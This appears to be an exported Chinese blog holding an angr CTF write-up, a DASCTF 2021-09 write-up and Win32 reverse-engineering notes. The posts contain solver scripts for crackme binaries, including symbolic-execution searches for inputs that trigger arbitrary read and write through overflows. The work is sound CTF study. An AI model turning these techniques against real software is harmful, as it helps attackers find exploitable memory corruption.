symbolic stack 这题的输入直接存到了 stack 中，因此需要把符号注入到 stack\n.text:08048682 lea eax, [ebp+var_10] ; 2nd input stores here .text:08048685 push eax .text:08048686 lea eax, [ebp+var_C] ; 1st input stores here .text:08048689 push eax .text:0804868A push offset aUU ; \u0026#34;%u %u\u0026#34; .text:0804868F call ___isoc99_scanf .text:08048694 add esp, 10h .text:08048697 mov eax, [ebp+var_C] ; state starts here .text:0804869A sub esp, 0Ch from angr import * import claripy proj = Project(\u0026#39;./04_angr_symbolic_stack\u0026#39;, main_opts={\u0026#39;base_addr\u0026#39;:0x8048000}) after_input_addr = 0x8048697 state = proj.factory.entry_state(addr=after_input_addr) user_input = [claripy.BVS(\u0026#39;input_%d\u0026#39; % i, 32) for i in range(2)] # state.regs.ebp = state.regs.esp state.regs.esp = state.regs.ebp - 8 state.stack_push(user_input[0]) state.stack_push(user_input[1]) simgr = proj.factory.simgr(state) find_addr = 0x80486E4 avoid_addr = 0x80486D2 simgr.explore(find=find_addr, avoid=avoid_addr) if simgr.found: for a in user_input: print (simgr.found[0].se.eval(a), end = \u0026#39; \u0026#39;) print () else: print (\u0026#34;no result\u0026#34;) 用的方法是 stack_push，所以需要先把 esp 设置好\n剩下的应该没什么变化\nsymbolic memory 这题是输入存到了 .bss 段中\n.text:080485E0 push offset unk_A1BA1D8 .text:080485E5 push offset unk_A1BA1D0 .text:080485EA push offset unk_A1BA1C8 .text:080485EF push offset user_input .text:080485F4 push offset a8s8s8s8s ; \u0026#34;%8s %8s %8s %8s\u0026#34; .text:080485F9 call ___isoc99_scanf .text:080485FE add esp, 20h .text:08048601 mov [ebp+var_C], 0 ; state starts here .text:08048608 jmp short loc_8048637 from angr import * import claripy proj = Project(\u0026#39;./05_angr_symbolic_memory\u0026#39;, main_opts={\u0026#34;base_addr\u0026#34;:0x8048000}) start_addr = 0x8048601 state = proj.factory.blank_state(addr = start_addr) user_input = [claripy.BVS(\u0026#39;input_%d\u0026#39; % i, 8) for i in range(32)] for u in user_input: state.solver.add(u \u0026gt;= 0x20) state.solver.add(u \u0026lt;= 0x7f) mem_addr = 0xA1BA1C0 for i in range(32): state.memory.store(mem_addr + i, user_input[i]) simgr = proj.factory.simgr(state) find_addr = 0x8048672 avoid_addr = 0x804865B simgr.explore(find=find_addr, avoid=avoid_addr) if simgr.found: for i in range(32): if i % 8 == 0 and i != 0: print (\u0026#39; \u0026#39;, end = \u0026#39;\u0026#39;) print (chr(simgr.found[0].se.eval(user_input[i])), end = \u0026#39;\u0026#39;) print () else: print (\u0026#34;no result\u0026#34;) 用的是 memory.store(store_addr, store_symbolic) 方法\nsymbolic dynamic memory buffer0 = (char *)malloc(9u); buffer1 = (char *)malloc(9u); memset(buffer0, 0, 9u); memset(buffer1, 0, 9u); printf(\u0026#34;Enter the password: \u0026#34;); __isoc99_scanf(\u0026#34;%8s %8s\u0026#34;, buffer0, buffer1, v6); 这题的输入存储到了 malloc 中，这个地址动态的，如果仅仅使用 memory.store() 无法确定存储的地址\n因此先将 buffer 的地址修改为一个自定义的虚假地址（因为 buffer 在 .bss 段上，地址是固定的），然后往这个地址中写入数据，后续程序的模拟执行会使用这个虚假地址\nfrom angr import * import claripy proj = Project(\u0026#39;./06_angr_symbolic_dynamic_memory\u0026#39;, main_opts={\u0026#39;base_addr\u0026#39;:0x8048000}) state_addr = 0x8048699 state = proj.factory.blank_state(addr = state_addr) buffer0_addr = 0xABCC8A4 buffer1_addr = 0xABCC8AC fake_heap_addr0 = 0xDEADBE00 fake_heap_addr1 = 0xDEADBF00 state.memory.store(buffer0_addr, fake_heap_addr0, endness=proj.arch.memory_endness) state.memory.store(buffer1_addr, fake_heap_addr1, endness=proj.arch.memory_endness) user_input = [claripy.BVS(\u0026#39;input_%d\u0026#39; % i, 8 * 8) for i in range(2)] state.memory.store(fake_heap_addr0, user_input[0]) state.memory.store(fake_heap_addr1, user_input[1]) simgr = proj.factory.simgr(state) find_addr = 0x8048759 avoid_addr = 0x8048747 simgr.explore(find=find_addr, avoid=avoid_addr) if simgr.found: print (simgr.found[0].se.eval(user_input[0], cast_to=bytes).decode(), simgr.found[0].se.eval(user_input[1], cast_to=bytes).decode()) else: print (\u0026#34;no result\u0026#34;) symbolic file 这题没有用预期做法来做\nfp = fopen(\u0026#34;OJKSQYDP.txt\u0026#34;, \u0026#34;rb\u0026#34;); fread(buffer, 1u, 0x40u, fp); fclose(fp); unlink(\u0026#34;OJKSQYDP.txt\u0026#34;); 既然这里有个从文件读取，那么可以直接把初始状态设置到文件读取后面，那么这道题就和之前做过的 symbolic memory 一样了\nfrom angr import * import claripy proj = Project(\u0026#39;./07_angr_symbolic_file\u0026#39;, main_opts={\u0026#39;base_addr\u0026#39;:0x8048000}) init_addr = 0x804893C state = proj.factory.blank_state(addr=init_addr) user_input = claripy.BVS(\u0026#39;user_input\u0026#39;, 8 * 8) mem_addr = 0x804A0A0 state.memory.store(mem_addr, user_input) simgr = proj.factory.simgr(state) find_addr = 0x80489B0 avoid_addr = 0x8048996 simgr.explore(find=find_addr, avoid=avoid_addr) if simgr.found: print (simgr.found[0].se.eval(user_input)) else: print (\u0026#39;no result\u0026#39;) constraints 这题的解法是对运算结果手动做约束，不知道为什么用之前的方法做不出来\nfrom angr import * import claripy proj = Project(\u0026#39;./08_angr_constraints\u0026#39;, load_options={\u0026#39;auto_load_libs\u0026#39;:False}, main_opts={\u0026#39;base_addr\u0026#39;:0x8048000}) start_addr = 0x8048625 start_state = proj.factory.blank_state(addr = start_addr) flag = claripy.BVS(\u0026#39;flag\u0026#39;, 8 * 16) buffer_addr = 0x804A050 start_state.memory.store(buffer_addr, flag) end_addr = 0x804866E simgr = proj.factory.simgr(start_state) simgr.explore(find = end_addr) if simgr.found: end_state = simgr.found[0] calc_res = end_state.memory.load(buffer_addr, 16) cipher = b\u0026#34;AUPDNNPROEZRJWKB\u0026#34; end_state.add_constraints(calc_res == cipher) print (end_state.se.eval(flag, cast_to=bytes)) else: print (\u0026#39;fail\u0026#39;) 仅模拟了for循环（加密部分），运行结束后直接使用 add_constraints 手动添加约束条件\nhook 又来了次非预期\nprintf(\u0026#34;Enter the password: \u0026#34;); __isoc99_scanf(\u0026#34;%16s\u0026#34;, buffer); for ( i = 0; i \u0026lt;= 15; ++i ) *(_BYTE *)(i + 134520916) = complex_function(*(char *)(i + 0x804A054), 18 - i); equals = check_equals_XYMKBKUHNIQYNQXE(buffer, 16); for ( j = 0; j \u0026lt;= 15; ++j ) *(_BYTE *)(j + 0x804A044) = complex_function(*(char *)(j + 134520900), j + 9); __isoc99_scanf(\u0026#34;%16s\u0026#34;, buffer); v3 = equals \u0026amp;\u0026amp; !strncmp(buffer, password, 0x10u); 显然，这道题可以拆成两部分来做，第一部分使用 constraints 求解第一次输入；第二部分直接获取 password 的运算结果\n于是相当于写了两次 angr（感觉完全可以合并起来，但稳妥起见，后面再试试）\nfrom angr import * import claripy proj = Project(\u0026#39;./09_angr_hooks\u0026#39;) start_state = 0x8048665 user_input = claripy.BVS(\u0026#39;user_input\u0026#39;, 8 * 16) init_state = proj.factory.blank_state(addr = start_state) buffer_addr = 0x804A054 init_state.memory.store(buffer_addr, user_input) simgr = proj.factory.simgr(init_state) end_addr = 0x80486AC simgr.explore(find = end_addr) if simgr.found: solution_state = simgr.found[0] result = solution_state.memory.load(buffer_addr, 16) solution_state.add_constraints(b\u0026#34;XYMKBKUHNIQYNQXE\u0026#34; == result) print (solution_state.solver.eval(user_input, cast_to=bytes).decode()) else: print (\u0026#34;fail\u0026#34;) second_start = 0x80486C0 second_state = proj.factory.blank_state(addr = second_start) second_state.memory.store(0x804A044, b\u0026#34;XYMKBKUHNIQYNQXE\u0026#34;) second_simgr = proj.factory.simgr(second_state) second_simgr.explore(find = 0x8048700) if second_simgr.found: result = second_simgr.found[0].memory.load(0x804A044, 16) print (second_simgr.found[0].solver.eval(result, cast_to=bytes).decode()) else: print (\u0026#34;no result\u0026#34;) 运行结果\nEnter the password: ZXIDRXEORJOTFFJN WUFAOUBLOGLQCCGK Good Job. 补上用hook写的，用了两种hook的写法（看到simprocedures那题才发现第二个是下一题的写法）\nfrom angr import * import claripy proj = Project(\u0026#39;./09_angr_hooks\u0026#39;) start_state = proj.factory.entry_state() check_addr = 0x80486B3 instraction_len = 5 choose_hook = 1 if choose_hook == 1: @proj.hook(check_addr, length = instraction_len) def replace_check_equal(state): target = b\u0026#39;XYMKBKUHNIQYNQXE\u0026#39; # claripy will convert it to bytes if it is str. input_addr = 0x804A054 cipher = state.memory.load(input_addr, 0x10) state.regs.eax = claripy.If(cipher == target, claripy.BVV(1, 32), claripy.BVV(0, 32)) if choose_hook == 2: class replace_check_equal(SimProcedure): def run(self): target = b\u0026#39;XYMKBKUHNIQYNQXE\u0026#39; input_addr = 0x804A054 cipher = self.state.memory.load(input_addr, 0x10) return claripy.If(cipher == target, claripy.BVV(1, 32), claripy.BVV(0, 32)) check_equal_symbol = \u0026#39;check_equals_XYMKBKUHNIQYNQXE\u0026#39; proj.hook_symbol(check_equal_symbol, replace_check_equal()) simgr = proj.factory.simgr(start_state) def is_success(state): output = state.posix.dumps(1) return b\u0026#39;Good Job.\u0026#39; in output def should_avoid(state): output = state.posix.dumps(1) return b\u0026#39;Try again.\u0026#39; in output simgr.explore(find = is_success, avoid = should_avoid) if simgr.found: print (simgr.found[0].posix.dumps(0)) else: print (\u0026#39;no solution\u0026#39;) simprocedures 同样先用之前的方法写了一遍\nfrom angr import * import claripy proj = Project(\u0026#39;./10_angr_simprocedures\u0026#39;) start_addr = 0x80486C3 init_state = proj.factory.blank_state(addr = start_addr) init_state.regs.esp = init_state.regs.ebp - 0xD user_input1 = claripy.BVS(\u0026#39;user_input1\u0026#39;, 8 * 4) user_input2 = claripy.BVS(\u0026#39;user_input2\u0026#39;, 8 * 4) user_input3 = claripy.BVS(\u0026#39;user_input3\u0026#39;, 8 * 4) user_input4 = claripy.BVS(\u0026#39;user_input4\u0026#39;, 8 * 4) init_state.stack_push(user_input4) init_state.stack_push(user_input3) init_state.stack_push(user_input2) init_state.stack_push(user_input1) init_state.regs.esp = init_state.regs.ebp - 0x28 simgr = proj.factory.simgr(init_state) check_addr = 0x80499F1 simgr.explore(find = check_addr) ans = b\u0026#34;ORSDDWXHZURJRBDH\u0026#34; if simgr.found: solution_state = simgr.found[0] input_addr = solution_state.regs.ebp - 0x1D result1 = solution_state.memory.load(input_addr, 4) result2 = solution_state.memory.load(input_addr + 4, 4) result3 = solution_state.memory.load(input_addr + 8, 4) result4 = solution_state.memory.load(input_addr + 12, 4) solution_state.add_constraints(ans[:4] == result1) solution_state.add_constraints(ans[4:8] == result2) solution_state.add_constraints(ans[8:12] == result3) solution_state.add_constraints(ans[12:] == result4) print (solution_state.solver.eval(user_input1, cast_to=bytes).decode()[::-1], end = \u0026#39;\u0026#39;) print (solution_state.solver.eval(user_input2, cast_to=bytes).decode()[::-1], end = \u0026#39;\u0026#39;) print (solution_state.solver.eval(user_input3, cast_to=bytes).decode()[::-1], end = \u0026#39;\u0026#39;) print (solution_state.solver.eval(user_input4, cast_to=bytes).decode()[::-1]) else: print (\u0026#34;no result\u0026#34;) 然后用 hook_symbol 试试\nfrom angr import * import claripy proj = Project(\u0026#39;./10_angr_simprocedures\u0026#39;) start_state = proj.factory.entry_state() class replace_check_equals(SimProcedure): def run(self, to_check, length): target = b\u0026#39;ORSDDWXHZURJRBDH\u0026#39; result = self.state.memory.load(to_check, length) return claripy.If(result == target, claripy.BVV(1, 32), claripy.BVV(0, 32)) check_equals_sym = \u0026#39;check_equals_ORSDDWXHZURJRBDH\u0026#39; proj.hook_symbol(check_equals_sym, replace_check_equals()) simgr = proj.factory.simgr(start_state) def is_successful(state): output = state.posix.dumps(1) return b\u0026#39;Good Job.\u0026#39; in output def should_abort(state): output = state.posix.dumps(1) return b\u0026#39;Try again.\u0026#39; in output simgr.explore(find = is_successful, avoid = should_abort) if simgr.found: print (simgr.found[0].posix.dumps(0)) else: print (\u0026#39;no result\u0026#39;) sim_scanf simProcedure 其实是 angr 用于缓解路径爆炸的一个策略，将一些有可能导致路径爆炸的库函数进行了重写，然而 angr 提供的重写可能存在不完善的地方，例如 scanf 无法支持多个参数，因此这道题目中，需要自己重写 scanf 的 SimProcedure，实现接收两个参数\n这道题主要学到的就是利用 globals 存储注入的符号\nfrom angr import * import claripy proj = Project(\u0026#39;./11_angr_sim_scanf\u0026#39;) start_state = proj.factory.entry_state() start_state.globals[\u0026#39;inputs\u0026#39;] = [] class replace_scanf(SimProcedure): def run(self, fmt, input1, input2): user_input1 = claripy.BVS(\u0026#39;user_input1\u0026#39;, 32) user_input2 = claripy.BVS(\u0026#39;user_input2\u0026#39;, 32) self.state.memory.store(input1, user_input1, endness = proj.arch.memory_endness) self.state.memory.store(input2, user_input2, endness = proj.arch.memory_endness) self.state.globals[\u0026#39;inputs\u0026#39;].append((user_input1, user_input2)) scanf_sym = \u0026#34;__isoc99_scanf\u0026#34; proj.hook_symbol(scanf_sym, replace_scanf()) simgr = proj.factory.simgr(start_state) def is_success(state): output = state.posix.dumps(1) return b\u0026#39;Good Job.\u0026#39; in output def should_avoid(state): output = state.posix.dumps(1) return b\u0026#39;Try again.\u0026#39; in output simgr.explore(find = is_success, avoid = should_avoid) if simgr.found: solution_state = simgr.found[0] for res in solution_state.globals[\u0026#39;inputs\u0026#39;]: print (solution_state.solver.eval(res[0]), end=\u0026#39; \u0026#39;) print (solution_state.solver.eval(res[1])) else: print (\u0026#39;no result\u0026#39;) veritesting 设置 simulation_manager 时，启用 veritesting 可以缓解一定程度的路径爆炸\nfrom angr import * import claripy proj = Project(\u0026#39;./12_angr_veritesting\u0026#39;) start_state = proj.factory.entry_state() simgr = proj.factory.simgr(start_state, veritesting=True) def is_success(state): output = state.posix.dumps(1) return b\u0026#39;Good\u0026#39; in output def should_avoid(state): output = state.posix.dumps(1) return b\u0026#39;Try\u0026#39; in output simgr.explore(find = is_success, avoid = should_avoid) if simgr.found: print (simgr.found[0].posix.dumps(0)) else: print (\u0026#39;No result\u0026#39;) 简单学习了一下 veritesting 的原理，在本题目的验证环节，代码为\nfor (int i=0; i\u0026lt;32; ++i) { if (buffer[i] == complex_function(${ write(\u0026#39;\\\u0026#39;\u0026#39; + letter0 + \u0026#39;\\\u0026#39;\u0026#39; ) }$, i + ${ write(integer) }$) ) { counter0++; } } 如果单纯以分支图来话，总共引入了 $2^{32}$ 种可能，然而事实上只有满足和不满足两种情况\n开启 veritesting 后，angr会在遇到基础代码（无系统调用，间接跳转等语句）时，从动态符号执行（为每一条路径生成一个表达式）切换到静态符号执行（将程序转换为表达式）。因此，在执行这个循环时，先动态恢复控制流图，找到静态符号执行容易分析和难以分析的语句，并推断出易分析节点到难分析节点的影响，最后切换回动态分析来处理不易处理的情况。\nstatic binary 在 sim_scanf 中说到，angr 将部分库函数替换为自己实现的 SimProcedures 来避免路径爆炸，但当遇到静态编译的二进制文件时，由于没有调用库函数，这些静态的函数就有可能造成路径爆炸，需要我们手动替换为 SimProcedures\nfrom angr import * proj = Project(\u0026#39;./13_angr_static_binary\u0026#39;) start_state = proj.factory.entry_state() proj.hook(0x804ED40, SIM_PROCEDURES[\u0026#39;libc\u0026#39;][\u0026#39;printf\u0026#39;]()) proj.hook(0x804ED80, SIM_PROCEDURES[\u0026#39;libc\u0026#39;][\u0026#39;scanf\u0026#39;]()) proj.hook(0x804F350, SIM_PROCEDURES[\u0026#39;libc\u0026#39;][\u0026#39;puts\u0026#39;]()) proj.hook(0x8048D10, SIM_PROCEDURES[\u0026#39;glibc\u0026#39;][\u0026#39;__libc_start_main\u0026#39;]()) simgr = proj.factory.simgr(start_state, veritesting = True) def is_success(state): output = state.posix.dumps(1) return b\u0026#39;Good Job.\u0026#39; in output def should_avoid(state): output = state.posix.dumps(1) return b\u0026#39;Try again.\u0026#39; in output simgr.explore(find = is_success, avoid = should_avoid) if simgr.found: solution = simgr.found[0] print (solution.posix.dumps(0)) else: print (\u0026#39;No result\u0026#39;) shared library 这道题目将加密部分放到了 so 文件中，因此需要执行 so 文件\n在执行时遇到的问题有\n 基地址不确定：使用 base_addr 来控制程序的基地址 符号注入的地址未知：使用 call_state 来控制函数调用时的参数  from angr import * import claripy base_addr = 0x400000 proj = Project(\u0026#39;./lib14_angr_shared_library.so\u0026#39;, main_opts={\u0026#39;base_addr\u0026#39;:base_addr}) store_addr = 0x300000 init_state = proj.factory.call_state(base_addr + 0x6d7, store_addr, claripy.BVV(8, 32)) user_input = claripy.BVS(\u0026#39;user_input\u0026#39;, 8 * 8) init_state.memory.store(store_addr, user_input, endness = proj.arch.memory_endness) find_addr = base_addr + 0x775 simgr = proj.factory.simgr(init_state) simgr.explore(find = find_addr) if simgr.found: solution = simgr.found[0] solution.add_constraints(solution.regs.eax != 0) print (solution.solver.eval(user_input, cast_to=bytes)) else: print (\u0026#39;no result\u0026#39;) arbitrary read 这道题有些复杂，由于需要让输入的部分溢出，控制 puts 的输出参数\n同样需要替换 scanf，同时，这道题目为了减小输入的可能性，需要手动添加一下对输入的约束，要求在可见字符范围内\nfrom angr import * import claripy proj = Project(\u0026#39;./15_angr_arbitrary_read\u0026#39;) init_state = proj.factory.entry_state() class replace_scanf(SimProcedure): def run(self, fmt, key_addr, stack_addr): user_input1 = claripy.BVS(\u0026#39;user_input1\u0026#39;, 32) user_input2 = claripy.BVS(\u0026#39;user_input2\u0026#39;, 20 * 8) for i in user_input2.chop(bits = 8): self.state.add_constraints(i \u0026gt; 0x20) self.state.add_constraints(i \u0026lt; 0x80) self.state.memory.store(key_addr, user_input1, endness = proj.arch.memory_endness) self.state.memory.store(stack_addr, user_input2) self.state.globals[\u0026#39;solutions\u0026#39;] = (user_input1, user_input2) proj.hook_symbol(\u0026#39;__isoc99_scanf\u0026#39;, replace_scanf()) simgr = proj.factory.simgr(init_state) def check_puts(state): output_addr = state.memory.load(state.regs.esp + 4, 4, endness = proj.arch.memory_endness) if not state.solver.symbolic(output_addr): return False FLAG = output_addr == 0x484F4A47 copy_state = state.copy() copy_state.add_constraints(FLAG) if copy_state.satisfiable(): state.add_constraints(FLAG) return True return False def is_success(state): puts_addr = 0x8048370 if state.addr == puts_addr: return check_puts(state) else: return False simgr.explore(find = is_success) if simgr.found: solution = simgr.found[0] user_input1, user_input2 = solution.globals[\u0026#39;solutions\u0026#39;] print (solution.solver.eval(user_input1), solution.solver.eval(user_input2, cast_to=bytes).decode()) else: print (\u0026#34;No result\u0026#34;) 不是很理解的地方是，为什么要先添加判断这个 constraints 是否满足，然后再添加到 state 中\narbitrary write 思路和上一题比较接近，这次使用了 strncpy 函数的参数作为检查\n遇到的一个问题是 BV 数据类型在选择部分数据上的问题\nfrom angr import * import claripy proj = Project(\u0026#39;./16_angr_arbitrary_write\u0026#39;) start_state = proj.factory.entry_state() class replace_scanf(SimProcedure): def run(self, fmt, key_addr, s_addr): user_input1 = claripy.BVS(\u0026#39;user_input1\u0026#39;, 32) user_input2 = claripy.BVS(\u0026#39;user_input2\u0026#39;, 8 * 20) for c in user_input2.chop(bits = 8): self.state.add_constraints(c \u0026gt; 0x20) self.state.add_constraints(c \u0026lt; 0x7f) self.state.memory.store(key_addr, user_input1, endness = proj.arch.memory_endness) self.state.memory.store(s_addr, user_input2) self.state.globals[\u0026#39;solutions\u0026#39;] = (user_input1, user_input2) proj.hook_symbol(\u0026#39;__isoc99_scanf\u0026#39;, replace_scanf()) simgr = proj.factory.simgr(start_state) def check_strncpy(state): dest_addr = state.memory.load(state.regs.esp + 4, 4, endness = proj.arch.memory_endness) src_addr = state.memory.load(state.regs.esp + 8, 4, endness = proj.arch.memory_endness) length = state.memory.load(state.regs.esp + 12, 4, endness = proj.arch.memory_endness) source = state.memory.load(src_addr, length) if not state.solver.symbolic(source) or not state.solver.symbolic(dest_addr): return False target_string = b\u0026#39;NDYNWEUJ\u0026#39; target_dest = 0x57584344 if state.satisfiable(extra_constraints = (target_dest == dest_addr, target_string == source[-1:-64])): state.add_constraints(target_dest == dest_addr, target_string == source[-1:-64]) return True return False def is_successful(state): if state.addr == 0x8048410: return check_strncpy(state) else: return False simgr.explore(find = is_successful) if simgr.found: solution_state = simgr.found[0] user_input1, user_input2 = solution_state.globals[\u0026#39;solutions\u0026#39;] print (solution_state.solver.eval(user_input1), solution_state.solver.eval(user_input2, cast_to=bytes).decode()) else: print (\u0026#34;No result\u0026#34;) ","date":"2021-09-27T21:03:03Z","permalink":"/post/angr-ctf-writeup/","title":"angr ctf writeup"},{"content":"[RE]ea5ycpp 一开始还被逻辑绕了一下，结果发现核心部分就是brainfuck\n有一些结构体，可以恢复一下，会比较好看\nbrainfuck解析出来就是简单的加减法\n#include \u0026lt;stdio.h\u0026gt;#include \u0026lt;stdlib.h\u0026gt; unsigned char a[9999]; int c; int main(int argc, char **argv) { a[24] += 2; while (a[24]) { ++a[0]; --a[24]; } a[24] += 3; while (a[24]) { ++a[1]; --a[24]; } a[24] += 4; while (a[24]) { ++a[2]; --a[24]; } a[24] += 5; while (a[24]) { ++a[3]; --a[24]; } a[24] += 6; while (a[24]) { ++a[4]; --a[24]; } a[24] += 7; while (a[24]) { ++a[5]; --a[24]; } a[24] += 8; while (a[24]) { ++a[6]; --a[24]; } a[24] += 9; while (a[24]) { ++a[7]; --a[24]; } a[24] += 10; while (a[24]) { ++a[8]; --a[24]; } a[24] += 11; while (a[24]) { ++a[9]; --a[24]; } a[24] += 12; while (a[24]) { ++a[10]; --a[24]; } a[24] += 13; while (a[24]) { ++a[11]; --a[24]; } a[24] += 14; while (a[24]) { ++a[12]; --a[24]; } a[24] += 15; while (a[24]) { ++a[13]; --a[24]; } a[24] += 16; while (a[24]) { ++a[14]; --a[24]; } a[24] += 18; while (a[24]) { ++a[15]; --a[24]; } a[24] += 19; while (a[24]) { ++a[16]; --a[24]; } a[24] += 20; while (a[24]) { ++a[17]; --a[24]; } a[24] += 21; while (a[24]) { ++a[18]; --a[24]; } a[24] += 22; while (a[24]) { ++a[19]; --a[24]; } a[24] += 23; while (a[24]) { ++a[20]; --a[24]; } a[24] += 24; while (a[24]) { ++a[21]; --a[24]; } a[24] += 25; while (a[24]) { ++a[22]; --a[24]; } a[24] += 26; while (a[24]) { ++a[23]; --a[24]; } return 0; } 根据字符串就能看到比较的位置，密文减一下就行\n[RE]easy_math 几个加减法解一下就行，甚至不需要z3\nif ( v20 - v16 == 0x61536369217Di64 ) { if ( v19 - v16 == 0x586531316Fi64 ) { if ( v18 - v16 == 0x5F3631626F4Ei64 ) { if ( v16 + v18 + v19 + v20 == 0xC121F9FCC23Ai64 ) 完事之后需要把flag拼一下，而且第一个输入好像没有用？\n反正我的输入是这个\n439904987003 107079497490813 448374321519 104755080884046 439904987003 [RE]pig_brain_king 玩了一下，发现是个记忆游戏，字符串越来越长，逻辑没有细看，感觉可能找到了flag生成函数吧，不过不重要，pwntools玩通就完事了\nfrom pwn import * p = process(\u0026#39;./pig_brain_king.exe\u0026#39;) context.log_level=\u0026#39;debug\u0026#39; for _ in range(1000): p.recvuntil(b\u0026#39;questions!\\r\\n\u0026#39;) ans = p.recvline() print (ans) p.recvuntil(b\u0026#39;enter:\u0026#39;) p.send(ans) p.interactive() 脚本没写好，最后一关需要自己动手复制一下（手动狗头）\n AK的人有点多，沉思（\n [Misc]Girlfriend\u0026rsquo;s account 一开始还想着找个工具，然后发现各种bug\n但认认真真写代码转码是不可能的，这辈子也不可能的，用vscode批量操作一把梭不香吗\ngirl = [ (4 * 100 + 6 * 10 + 7 + 3 * 0.1 + 4 * 0.01) * 6, (1 * 100 + 6 * 10 + 9 + 0) * 9, (4 * 100 + 7 * 10 + 8 + 0) * 8, (9 * 100 + 6 * 10 + 2 + 6 * 0.1 + 4 * 0.01) * 5, (1 * 100 + 4 * 10 + 5 + 8 * 0.1 + 1 * 0.01) * 9, # ... (5 * 100 + 8 * 10 + 3 + 2 * 0.1 + 9 * 0.01) * 7, (7 * 100 + 8 * 10 + 1 + 9 * 0.1 + 0) * 5, (7 * 100 + 7 * 10 + + 0) * 4, (1 * 100 + 1 * 10 + 9 + 9 * 0.1 + 9 * 0.01) * 5, ] spend = 0 for g in girl: spend += g print (spend) 这账单，幸好没有npy\n[Misc]blind 压缩包里有俩“一样”的图片，用工具xor一看，发现只有一点蓝色，猜测可能是个盲水印，上网找工具装环境\n\routput.png\r\n解出来发现是个盲文\n网上找了半天，才发现是拼音盲文，麻了\n[Crypto]签到 说出来可能不信，这求解脚本是我在贴吧找到的\u0026hellip;\ne=discrete_log(c,mod(m,n)) ","date":"2021-09-26T00:10:18Z","permalink":"/post/dasctf-2021-09-writeup/","title":"DASCTF 2021-09 Writeup"},{"content":"suibiankankan\n基础知识 分析的一般途径和策略  学会软件的操作和使用方法 $\\to$ 推测出软件的设计思想和编程思路 静态分析：阅读反汇编的程序清单，利用人机交互的提示信息了解片段所完成的功能，宏观了解软件的编程思路 动态跟踪：首先完成反反调试，并解密加密程序，了解初始化工作，获得各个模块之间的中间结果  粗跟踪：不跟踪调用等指令，仅根据执行结果分析程序的功能 细跟踪：针对性跟踪分析关键模块    文本字符 ASCII 和 Unicode Unicode 是 ASCII 的扩展，所有字符都是 16 位\n字节存储顺序 小端序（Little-endian）：高位字节存入高地址，低位字节存入低地址\n大端序（Big-endian）：高位字节存入低地址，低位字节存入高地址\n   字节序 0 1 2 3     大端序 12 34 56 78   小端序 78 56 34 12    Windows Win 32 API 32位API与64位API在名称和功能上基本没有变化\nWindows运转核心为DLL动态链接库\n KERNEL32.DLL：操作系统核心功能服务，进程与线程控制、内存管理、文件访问等 USER32.DLL：负责处理用户接口，包括键盘和鼠标输入、窗口和菜单管理等 GDI：图形设备接口，允许程序在屏幕和打印机上显示文本和图形  Windows消息机制 Windows使用Message提供应用程序与应用程序、应用程序与操作系统之间的通信\n常用的函数如下：\nSendMessage 调用一个窗口的窗口函数，将一条消息发送给那个窗口。除非消息处理完毕，否则不会返回\nLRESULT SendMessage( HWND hwnd,\t// 目的窗口的句柄 \tUINT Msg,\t// 消息标识符 \tWPARAM wParam,\t// 消息的WPARAM域 \tLPARAM lParam\t// 消息的LPARAM域 ); 返回值：消息投递成功，返回非零\nWM_COMMAND 当用户从菜单或按钮中选择一条命令或者一个控件时该消息被发送给它的父窗口，或者当一个快捷键被释放时发送该消息。\nWM_COMMAND wNotifyCode = HIWORD(wParam);\t// 通告函数 \twID = LOWORD(wParam);\t// 菜单条目、控件或快捷键的标识符 \thwndCtl = (HWND) lParam;\t// 控件句柄 返回值：如果应用程序处理这条消息，则返回值为零\nWM_DESTORY 当一个窗口被销毁时发送该消息。该消息对应 0x02，没有参数\n返回值：如果应用程序处理这条消息，则返回值为零\nWM_GETTEXT 当需要将一个窗口的文本复制到一个由呼叫程序提供的缓冲区中时，发送该消息。该消息对应 0x0D\nWM_GETTEXT wParam = (WPARAM) cchTextMax;\t// 需要复制的字符数 \tlParam = (LPARAM) lpszText;\t// 接收文本的缓冲区地址 返回值：被复制的字符数\nWM_QUIT 当应用程序调用 PostQuitMessage 时，生成 WM_QUIT消息，对应 0x12\nWM_QUIT nExitCode = (int) wParam;\t// 退出代码 无返回值\nWM_LBUTTONDOWN 光标停在窗口客户区且点击左键时，发送此消息\n如果鼠标未捕捉，将下发给光标下的窗口，否则发送给捕获鼠标动作的窗口\n对应 0x201\nWM_LBUTTONDOWN fwkeys = wParam;\t// key旗帜 \txPos = LOWORD(lParam);\t// 光标的水平位置 \tyPos = HIWORD(lParam);\t// 光标的垂直位置 返回值：如果应用程序处理了这条消息，返回值为零\n虚拟内存  应用程序不会直接访问物理地址 虚拟内存管理器通过虚拟地址的访问请求来控制所有的物理地址访问 每个应用都有独立的寻址空间，不同应用程序的地址空间是彼此隔离的 DLL程序没有私有空间，总是被映射到其他应用程序的地址空间中，作为程序的一部分运行  动态分析技术 逆向分析技术 Win32 启动 程序先执行启动代码，随后调用 WinMain 函数\n实例中的系统调用：\nCall KERNEL32.GetVersion ; 确定Windows系统版本\rCall KERNEL32.GetCommandLineA ; 指向系统的完整命令行的指针\rCall KERNEL32.GetStartupInfoA ; 获取一个进程的启动信息\rCall KERNEL32.GetModuleHandleA ; 返回进程地址空间执行文件基地址\rcall 00401000 ; 调用WinMain\rcall 004012EC ; 退出程序\rret\r 通常无需关注启动，直接查看 WinMain 即可\n 函数调用 编译器通常使用 call 和 ret 指令来调用函数\ncall 指令将其之后的指令地址压入栈顶，ret 指令则返回到调用位置\n有时可能利用寄存器进行间接调用，如： call eax\n参数传递 栈 调用函数时，将参数压入栈中\n对于不同语言，有不同的调用约定\n   类型 C/C++(__cdecl) pascal stdcall fastcall     参数传递顺序 从右向左 从左向右 从右向左 使用寄存器和栈   平衡栈 调用者 子程序 子程序 子程序   VARARG 是 否 允许*      VARARG表示参数个数可以不确定\nstdcall中，如果参数个数不确定，需要由调用程序来平衡栈\n 程序执行过程：\n 调用者将函数执行完毕时应返回的地址、参数压入栈 函数使用 ebp 指针+偏移量对栈中的参数进行寻址并取出，完成操作 子程序使用 ret 或 retf 指令返回， eip 置为栈中保存的地址，并继续执行  栈的建立过程（两个参数时）：\n 先将 arg2 压栈，esp=K-04h 将 arg1 压栈，esp=K-08h 执行 call ，把返回地址压栈，esp=K-0Ch 为了程序能够恢复，将 ebp 压栈，esp=K-10h move ebp, esp，将当前的栈顶设置为栈底 sub esp, 8 ，定义局部变量，两个变量分别为 [esp-4] 和 [esp-8] 函数结束时，add esp, 8 释放局部变量占用，或者使用 ret 8 来释放   还可以用enter和leave指令维护\nenter 指令：push ebp，mov ebp, esp，sub esp, xxx\nleave 指令：add esp, xxx，pop ebp\n 寄存器 通常遵循 fastcall 